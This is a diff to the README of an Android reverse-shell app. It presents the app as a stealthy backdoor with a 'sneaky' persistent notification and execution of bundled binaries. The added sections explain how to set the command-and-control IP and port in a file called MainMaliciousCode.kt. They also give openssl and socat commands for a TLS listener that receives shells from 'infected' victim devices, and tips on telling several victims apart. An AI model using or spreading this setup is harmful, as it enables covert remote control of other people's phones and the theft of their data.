@@ -21,7 +21,7 @@ This is the Reverse Shell in action. On the right you can see the device app dra
 
 ![screenshot1](screenshot1.png)
 
-Unfortunately, to guarantee persistence, the app must show a persistent notification (sneaky as possible):
+Unfortunately, to guarantee persistence, the app must show a persistent notification (as sneaky as possible):
 
 ![screenshot2](screenshot2.png)
 
@@ -37,9 +37,7 @@ This app is able to execute ELF files using `execve` function. This function is 
 
 For more details: https://android-review.googlesource.com/c/platform/system/sepolicy/+/804149
 
-So in order to compile this app a target API level between 26 and 28 must be set.
-
-This, of course, resulted in a number of limitations so that certain features could not be included or used within the app.
+So in order to compile this app a target API level between 26 and 28 must be set. This, of course, resulted in a number of limitations so that certain features could not be included or used within the app.
 
 ### Statically linked binaries
 
@@ -70,3 +68,29 @@ Binaries included by default are not compiled by me! You can find these on vario
 - https://github.com/ryanwoodsmall/static-binaries
 - https://github.com/mosajjal/binary-tools
 - https://github.com/andrew-d/static-binaries
+
+### Command and Control settings
+In order to set your C2 server you must modify `./revshellSdk28/app/src/main/java/org/android/settings/MainMaliciousCode.kt`.
+
+You can use an IP or an hostname. Example:
+```
+    object C2 {
+        //const val IP    = "myc2.server.it"
+        const val IP    = "123.123.123.123"
+        const val RPORT = 443
+        const val RETRY = 5
+    }
+```
+Ofcourse you must use a **public address**, set **port forwarding** and firewall rules on your router. Additionally, you can use DNS, Ngrok and other services for reachability and to route your traffic but **how to set this configurations or use those services is out of the scope of this documentation!**
+
+### How to start a session
+1. Generate a certificate for the TLS connection on you C2 server:
+```
+openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 1000 -out bind.crt
+cat bind.key bind.crt > bind.pem
+```
+2. Create a listener with your favourite tool. Example:
+```
+sudo socat -d -d OPENSSL-LISTEN:443,cert=bind.pem,verify=0,fork STDOUT
+```
+Note: this app is not designed to work in a multi-client environment. The easiest thing you can do to use it with multiple devices is to use a different IP port for each infected machine and change the content of `./revshellSdk28/app/src/main/res/raw/whoami` to set a recognizable name for the victim system.
